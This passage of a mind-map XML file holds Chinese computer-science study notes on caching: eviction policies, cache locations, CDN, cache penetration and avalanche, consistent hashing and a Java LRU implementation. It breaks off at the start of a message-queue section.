<node FOLDED="true" ID="ID_1898136559" CREATED="1754750651070" MODIFIED="1754750651070"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      一、缓存特征
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_1216286242" CREATED="1754750651071" MODIFIED="1754750651072"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      命中率
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 命中率" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E7%BC%93%E5%AD%98.md#命中率">
</a>
    <p dir="auto">
      当某个请求能够通过访问缓存而得到响应时，称为缓存命中。
    </p>
    <p dir="auto">
      缓存命中率越高，缓存的利用率也就越高。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_1676109254" CREATED="1754750651073" MODIFIED="1754750651074"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      最大空间
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 最大空间" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E7%BC%93%E5%AD%98.md#最大空间">
</a>
    <p dir="auto">
      缓存通常位于内存中，内存的空间通常比磁盘空间小的多，因此缓存的最大空间不可能非常大。
    </p>
    <p dir="auto">
      当缓存存放的数据量超过最大空间时，就需要淘汰部分数据来存放新到达的数据。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_1957471271" CREATED="1754750651074" MODIFIED="1754750651076"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      淘汰策略
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 淘汰策略" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E7%BC%93%E5%AD%98.md#淘汰策略">
</a>
    <ul dir="auto">
      <li>
        <p dir="auto">
          FIFO（First In First Out）：先进先出策略，在实时性的场景下，需要经常访问最新的数据，那么就可以使用 FIFO，使得最先进入的数据（最晚的数据）被淘汰。
        </p>
      </li>
      <li>
        <p dir="auto">
          LRU（Least Recently Used）：最近最久未使用策略，优先淘汰最久未使用的数据，也就是上次被访问时间距离现在最久的数据。该策略可以保证内存中的数据都是热点数据，也就是经常被访问的数据，从而保证缓存命中率。
        </p>
      </li>
      <li>
        <p dir="auto">
          LFU（Least Frequently Used）：最不经常使用策略，优先淘汰一段时间内使用次数最少的数据。
        </p>
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_1790474361" CREATED="1754750651076" MODIFIED="1754750651076"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      二、缓存位置
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_1603327732" CREATED="1754750651078" MODIFIED="1754750651079"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      浏览器
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 浏览器" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E7%BC%93%E5%AD%98.md#浏览器">
</a>
    <p dir="auto">
      当 HTTP 响应允许进行缓存时，浏览器会将 HTML、CSS、JavaScript、图片等静态资源进行缓存。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_118066538" CREATED="1754750651080" MODIFIED="1754750651081"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      ISP
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: ISP" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E7%BC%93%E5%AD%98.md#isp">
</a>
    <p dir="auto">
      网络服务提供商（ISP）是网络访问的第一跳，通过将数据缓存在 ISP 中能够大大提高用户的访问速度。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_960229792" CREATED="1754750651081" MODIFIED="1754750651083"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      反向代理
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 反向代理" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E7%BC%93%E5%AD%98.md#反向代理">
</a>
    <p dir="auto">
      反向代理位于服务器之前，请求与响应都需要经过反向代理。通过将数据缓存在反向代理，在用户请求反向代理时就可以直接使用缓存进行响应。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_330887041" CREATED="1754750651083" MODIFIED="1754750651085"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      本地缓存
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 本地缓存" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E7%BC%93%E5%AD%98.md#本地缓存">
</a>
    <p dir="auto">
      使用 Guava Cache 将数据缓存在服务器本地内存中，服务器代码可以直接读取本地内存中的缓存，速度非常快。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_1341492389" CREATED="1754750651085" MODIFIED="1754750651086"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      分布式缓存
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 分布式缓存" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E7%BC%93%E5%AD%98.md#分布式缓存">
</a>
    <p dir="auto">
      使用 Redis、Memcache 等分布式缓存将数据缓存在分布式缓存系统中。
    </p>
    <p dir="auto">
      相对于本地缓存来说，分布式缓存单独部署，可以根据需求分配硬件资源。不仅如此，服务器集群都可以访问分布式缓存，而本地缓存需要在服务器集群之间进行同步，实现难度和性能开销上都非常大。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_1589038795" CREATED="1754750651087" MODIFIED="1754750651088"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      数据库缓存
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 数据库缓存" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E7%BC%93%E5%AD%98.md#数据库缓存">
</a>
    <p dir="auto">
      MySQL 等数据库管理系统具有自己的查询缓存机制来提高查询效率。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_1798812178" CREATED="1754750651089" MODIFIED="1754750651090"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      Java 内部的缓存
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: Java 内部的缓存" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E7%BC%93%E5%AD%98.md#java-内部的缓存">
</a>
    <p dir="auto">
      Java 为了优化空间，提高字符串、基本数据类型包装类的创建效率，设计了字符串常量池及 Byte、Short、Character、Integer、Long、Boolean 这六种包装类缓冲池。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_494945801" CREATED="1754750651091" MODIFIED="1754750651093"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      CPU 多级缓存
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: CPU 多级缓存" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E7%BC%93%E5%AD%98.md#cpu-多级缓存">
</a>
    <p dir="auto">
      CPU 为了解决运算速度与主存 IO 速度不匹配的问题，引入了多级缓存结构，同时使用 MESI 等缓存一致性协议来解决多核 CPU 缓存数据一致性的问题。
    </p>
  </body>
</html></richcontent>
</node>
</node>
<node ID="ID_1303330509" CREATED="1754750651093" MODIFIED="1754750651094"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      三、CDN
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 三、CDN" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E7%BC%93%E5%AD%98.md#三cdn">
</a>
    <p dir="auto">
      内容分发网络（Content distribution network，CDN）是一种互连的网络系统，它利用更靠近用户的服务器从而更快更可靠地将 HTML、CSS、JavaScript、音乐、图片、视频等静态资源分发给用户。
    </p>
    <p dir="auto">
      CDN 主要有以下优点：
    </p>
    <ul dir="auto">
      <li>
        更快地将数据分发给用户；
      </li>
      <li>
        通过部署多台服务器，从而提高系统整体的带宽性能；
      </li>
      <li>
        多台服务器可以看成是一种冗余机制，从而具有高可用性。
      </li>
    </ul>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/8c280fdf33c046330ad70a08751bf7fc56fec068f95b12887497100d75a05372/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f31353331336564382d613532302d343739392d613330302d3262366233366265333134662e6a7067" color="#ffffff"><img src="https://camo.githubusercontent.com/8c280fdf33c046330ad70a08751bf7fc56fec068f95b12887497100d75a05372/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f31353331336564382d613532302d343739392d613330302d3262366233366265333134662e6a7067" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/15313ed8-a520-4799-a300-2b6b36be314f.jpg"/>
    </a><br/>
  </body>
</html></richcontent>
</node>
<node FOLDED="true" ID="ID_1276775665" CREATED="1754750651095" MODIFIED="1754750651095"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      四、缓存问题
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_155226284" CREATED="1754750651096" MODIFIED="1754750651098"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      缓存穿透
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 缓存穿透" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E7%BC%93%E5%AD%98.md#缓存穿透">
</a>
    <p dir="auto">
      指的是对某个一定不存在的数据进行请求，该请求将会穿透缓存到达数据库。
    </p>
    <p dir="auto">
      解决方案：
    </p>
    <ul dir="auto">
      <li>
        对这些不存在的数据缓存一个空数据；
      </li>
      <li>
        对这类请求进行过滤。
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
<node ID="ID_1094228186" CREATED="1754750651098" MODIFIED="1754750651100"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      缓存雪崩
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 缓存雪崩" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E7%BC%93%E5%AD%98.md#缓存雪崩">
</a>
    <p dir="auto">
      指的是由于数据没有被加载到缓存中，或者缓存数据在同一时间大面积失效（过期），又或者缓存服务器宕机，导致大量的请求都到达数据库。
    </p>
    <p dir="auto">
      在有缓存的系统中，系统非常依赖于缓存，缓存分担了很大一部分的数据请求。当发生缓存雪崩时，数据库无法处理这么大的请求，导致数据库崩溃。
    </p>
    <p dir="auto">
      解决方案：
    </p>
    <ul dir="auto">
      <li>
        为了防止缓存在同一时间大面积过期导致的缓存雪崩，可以通过观察用户行为，合理设置缓存过期时间来实现；
      </li>
      <li>
        为了防止缓存服务器宕机出现的缓存雪崩，可以使用分布式缓存，分布式缓存中每一个节点只缓存部分的数据，当某个节点宕机时可以保证其它节点的缓存仍然可用。
      </li>
      <li>
        也可以进行缓存预热，避免在系统刚启动不久由于还未将大量数据进行缓存而导致缓存雪崩。
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
<node ID="ID_1589975367" CREATED="1754750651100" MODIFIED="1754750651102"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      缓存一致性
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 缓存一致性" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E7%BC%93%E5%AD%98.md#缓存一致性">
</a>
    <p dir="auto">
      缓存一致性要求数据更新的同时缓存数据也能够实时更新。
    </p>
    <p dir="auto">
      解决方案：
    </p>
    <ul dir="auto">
      <li>
        在数据更新的同时立即去更新缓存；
      </li>
      <li>
        在读缓存之前先判断缓存是否是最新的，如果不是最新的先进行更新。
      </li>
    </ul>
    <p dir="auto">
      要保证缓存一致性需要付出很大的代价，缓存数据最好是那些对一致性要求不高的数据，允许缓存数据存在一些脏数据。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_947532836" CREATED="1754750651102" MODIFIED="1754750651104"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      缓存 “无底洞” 现象
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 缓存 “无底洞” 现象" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E7%BC%93%E5%AD%98.md#缓存-无底洞-现象">
</a>
    <p dir="auto">
      指的是为了满足业务要求添加了大量缓存节点，但是性能不但没有好转反而下降了的现象。
    </p>
    <p dir="auto">
      产生原因：缓存系统通常采用 hash 函数将 key 映射到对应的缓存节点，随着缓存节点数目的增加，键值分布到更多的节点上，导致客户端一次批量操作会涉及多次网络操作，这意味着批量操作的耗时会随着节点数目的增加而不断增大。此外，网络连接数变多，对节点的性能也有一定影响。
    </p>
    <p dir="auto">
      解决方案：
    </p>
    <ul dir="auto">
      <li>
        优化批量数据操作命令；
      </li>
      <li>
        减少网络通信次数；
      </li>
      <li>
        降低接入成本，使用长连接 / 连接池，NIO 等。
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_1020427328" CREATED="1754750651104" MODIFIED="1754750651104"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      五、数据分布
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_939063443" CREATED="1754750651105" MODIFIED="1754750651107"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      哈希分布
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 哈希分布" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E7%BC%93%E5%AD%98.md#哈希分布">
</a>
    <p dir="auto">
      哈希分布就是将数据计算哈希值之后，按照哈希值分配到不同的节点上。例如有 N 个节点，数据的主键为 key，则将该数据分配的节点序号为：hash(key)%N。
    </p>
    <p dir="auto">
      传统的哈希分布算法存在一个问题：当节点数量变化时，也就是 N 值变化，那么几乎所有的数据都需要重新分布，将导致大量的数据迁移。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_1072413063" CREATED="1754750651107" MODIFIED="1754750651109"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      顺序分布
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 顺序分布" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E7%BC%93%E5%AD%98.md#顺序分布">
</a>
    <p dir="auto">
      将数据划分为多个连续的部分，按数据的 ID 或者时间分布到不同节点上。例如 User 表的 ID 范围为 1 ~ 7000，使用顺序分布可以将其划分成多个子表，对应的主键范围为 1 ~ 1000，1001 ~ 2000，...，6001 ~ 7000。
    </p>
    <p dir="auto">
      顺序分布相比于哈希分布的主要优点如下：
    </p>
    <ul dir="auto">
      <li>
        能保持数据原有的顺序；
      </li>
      <li>
        并且能够准确控制每台服务器存储的数据量，从而使得存储空间的利用率最大。
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_996179552" CREATED="1754750651109" MODIFIED="1754750651110"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      六、一致性哈希
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 六、一致性哈希" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E7%BC%93%E5%AD%98.md#六一致性哈希">
</a>
    <p dir="auto">
      Distributed Hash Table（DHT） 是一种哈希分布方式，其目的是为了克服传统哈希分布在服务器节点数量变化时大量数据迁移的问题。
    </p>
  </body>
</html></richcontent>
<node ID="ID_1058016255" CREATED="1754750651111" MODIFIED="1754750651112"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      基本原理
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 基本原理" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E7%BC%93%E5%AD%98.md#基本原理">
</a>
    <p dir="auto">
      将哈希空间 [0, 2<sup>n</sup>-1] 看成一个哈希环，每个服务器节点都配置到哈希环上。每个数据对象通过哈希取模得到哈希值之后，存放到哈希环中顺时针方向第一个大于等于该哈希值的节点上。
    </p>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/28fe3b82c7f070af272eb450fe91437410a3a42339034c1cdc50b6c1fcb164b6/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f36386231313062392d373663362d346565322d623534312d3431343565363561646233652e6a7067" color="#ffffff"><img src="https://camo.githubusercontent.com/28fe3b82c7f070af272eb450fe91437410a3a42339034c1cdc50b6c1fcb164b6/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f36386231313062392d373663362d346565322d623534312d3431343565363561646233652e6a7067" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/68b110b9-76c6-4ee2-b541-4145e65adb3e.jpg"/>
    </a><br/>
    

    <p dir="auto">
      一致性哈希在增加或者删除节点时只会影响到哈希环中相邻的节点，例如下图中新增节点 X，只需要将它前一个节点 C 上的数据重新进行分布即可，对于节点 A、B、D 都没有影响。
    </p>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/b7a828e251a00428c247023e3e7ced89debc839642f4d1daa06847a9276eaa67/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f36363430323832382d666232622d343138662d383366362d3832313533343931626366652e6a7067" color="#ffffff"><img src="https://camo.githubusercontent.com/b7a828e251a00428c247023e3e7ced89debc839642f4d1daa06847a9276eaa67/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f36363430323832382d666232622d343138662d383366362d3832313533343931626366652e6a7067" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/66402828-fb2b-418f-83f6-82153491bcfe.jpg"/>
    </a><br/>
  </body>
</html></richcontent>
</node>
<node ID="ID_19557837" CREATED="1754750651113" MODIFIED="1754750651115"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      虚拟节点
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 虚拟节点" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E7%BC%93%E5%AD%98.md#虚拟节点">
</a>
    <p dir="auto">
      上面描述的一致性哈希存在数据分布不均匀的问题，节点存储的数据量有可能会存在很大的不同。
    </p>
    <p dir="auto">
      数据不均匀主要是因为节点在哈希环上分布的不均匀，这种情况在节点数量很少的情况下尤其明显。
    </p>
    <p dir="auto">
      解决方式是通过增加虚拟节点，然后将虚拟节点映射到真实节点上。虚拟节点的数量比真实节点来得多，那么虚拟节点在哈希环上分布的均匀性就会比原来的真实节点好，从而使得数据分布也更加均匀。
    </p>
  </body>
</html></richcontent>
</node>
</node>
<node ID="ID_147488101" CREATED="1754750651116" MODIFIED="1754750651118"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      七、LRU
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 七、LRU" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E7%BC%93%E5%AD%98.md#七lru">
</a>
    <p dir="auto">
      以下是基于 双向链表 + HashMap 的 LRU 算法实现，对算法的解释如下：
    </p>
    <ul dir="auto">
      <li>
        访问某个节点时，将其从原来的位置删除，并重新插入到链表头部。这样就能保证链表尾部存储的就是最近最久未使用的节点，当节点数量大于缓存最大空间时就淘汰链表尾部的节点。
      </li>
      <li>
        为了使删除操作时间复杂度为 O(1)，就不能采用遍历的方式找到某个节点。HashMap 存储着 Key 到节点的映射，通过 Key 就能以 O(1) 的时间得到节点，然后再以 O(1) 的时间将其从双向队列中删除。
      </li>
    </ul>
    <pre>public class LRU&lt;K, V&gt; implements Iterable&lt;K&gt; {
    private Node head;
    private Node tail;
    private HashMap&lt;K, Node&gt; map;
    private int maxSize;
    private class Node {
        Node pre;
        Node next;
        K k;
        V v;
        public Node(K k, V v) {
            this.k = k;
            this.v = v;
        }
    }
    public LRU(int maxSize) {
        this.maxSize = maxSize;
        this.map = new HashMap&lt;&gt;(maxSize * 4 / 3);
        head = new Node(null, null);
        tail = new Node(null, null);
        head.next = tail;
        tail.pre = head;
    }
    public V get(K key) {
        if (!map.containsKey(key)) {
            return null;
        }
        Node node = map.get(key);
        unlink(node);
        appendHead(node);
        return node.v;
    }
    public void put(K key, V value) {
        if (map.containsKey(key)) {
            Node node = map.get(key);
            unlink(node);
        }
        Node node = new Node(key, value);
        map.put(key, node);
        appendHead(node);
        if (map.size() &gt; maxSize) {
            Node toRemove = removeTail();
            map.remove(toRemove.k);
        }
    }
    private void unlink(Node node) {
        Node pre = node.pre;
        Node next = node.next;
        pre.next = next;
        next.pre = pre;
        node.pre = null;
        node.next = null;
    }
    private void appendHead(Node node) {
        Node next = head.next;
        node.next = next;
        next.pre = node;
        node.pre = head;
        head.next = node;
    }
    private Node removeTail() {
        Node node = tail.pre;
        Node pre = node.pre;
        tail.pre = pre;
        pre.next = tail;
        node.pre = null;
        node.next = null;
        return node;
    }
    @Override
    public Iterator&lt;K&gt; iterator() {
        return new Iterator&lt;K&gt;() {
            private Node cur = head.next;
            @Override
            public boolean hasNext() {
                return cur != tail;
            }
            @Override
            public K next() {
                Node node = cur;
                cur = cur.next;
                return node.k;
            }
        };
    }
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1955404615" CREATED="1754750651118" MODIFIED="1754750651120"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      参考资料
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 参考资料" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E7%BC%93%E5%AD%98.md#参考资料">
</a>
    <ul dir="auto">
      <li>
        大规模分布式存储系统
      </li>
      <li>
        <a href="https://tech.meituan.com/cache_about.html" rel="nofollow">缓存那些事</a>
      </li>
      <li>
        <a href="https://my.oschina.net/jayhu/blog/732849" rel="nofollow">一致性哈希算法</a>
      </li>
      <li>
        <a href="https://zh.wikipedia.org/wiki/%E5%85%A7%E5%AE%B9%E5%82%B3%E9%81%9E%E7%B6%B2%E8%B7%AF" rel="nofollow">内容分发网络</a>
      </li>
      <li>
        <a href="https://www.aspirationhosting.com/aspiration-cdn/" rel="nofollow">How Aspiration CDN helps to improve your website loading speed?</a>
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_1597906137" CREATED="1754749809784" MODIFIED="1754750716906" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      消息队列
    </p>
  </body>
</html>
</richcontent>
<node FOLDED="true" ID="ID_303690491" CREATED="1754750651121" MODIFIED="1754750651121"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      一、消息模型
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_1627294370" CREATED="1754750651125" MODIFIED="1754750651126"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      点对点
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 点对点" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97.md#点对点">
</a>
    <p dir="auto">
      消息生产者向消息队列中发送了一个消息之后，只能被一个消费者消费一次。
    </p>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/bbc8ed8dd9f1bd49134a23d350fe9a53e1afe76a90f3eb67aa809e16cc1acf30/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f696d6167652d32303139313231323031313235303631332e706e67" color="#ffffff"><img src="https://camo.githubusercontent.com/bbc8ed8dd9f1bd49134a23d350fe9a53e1afe76a90f3eb67aa809e16cc1acf30/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f696d6167652d32303139313231323031313235303631332e706e67" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/image-20191212011250613.png"/>
    </a><br/>
  </body>
</html></richcontent>
</node>
<node ID="ID_1374044323" CREATED="1754750651127" MODIFIED="1754750651128"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      发布/订阅
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 发布/订阅" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97.md#发布订阅">
</a>
    <p dir="auto">
      消息生产者向频道发送一个消息之后，多个消费者可以从该频道订阅到这条消息并消费。
    </p>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/39cb7673c6f28d430831a951e0aaa7b1f4ea858c1e38420d662562d80c8345e3/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f696d6167652d32303139313231323031313431303337342e706e67" color="#ffffff"><img src="https://camo.githubusercontent.com/39cb7673c6f28d430831a951e0aaa7b1f4ea858c1e38420d662562d80c8345e3/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f696d6167652d32303139313231323031313431303337342e706e67" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/image-20191212011410374.png"/>
    </a><br/>
    

    <p dir="auto">
      发布与订阅模式和观察者模式有以下不同：
    </p>
    <ul dir="auto">
      <li>
        观察者模式中，观察者和主题都知道对方的存在；而在发布与订阅模式中，生产者与消费者不知道对方的存在，它们之间通过频道进行通信。
      </li>
      <li>
        观察者模式是同步的，当事件触发时，主题会调用观察者的方法，然后等待方法返回；而发布与订阅模式是异步的，生产者向频道发送一个消息之后，就不需要关心消费者何时去订阅这个消息，可以立即返回。
      </li>
    </ul>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/21f45b89fb17191e795f73acdd3b09641827a6d70ceef79ea81deaaed469ef46/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f696d6167652d32303139313231323031313734373936372e706e67" color="#ffffff"><img src="https://camo.githubusercontent.com/21f45b89fb17191e795f73acdd3b09641827a6d70ceef79ea81deaaed469ef46/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f696d6167652d32303139313231323031313734373936372e706e67" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/image-20191212011747967.png"/>
    </a><br/>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_1527909115" CREATED="1754750651129" MODIFIED="1754750651129"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      二、使用场景
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_1286484719" CREATED="1754750651130" MODIFIED="1754750651131"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      异步处理
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 异步处理" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97.md#异步处理">
</a>
    <p dir="auto">
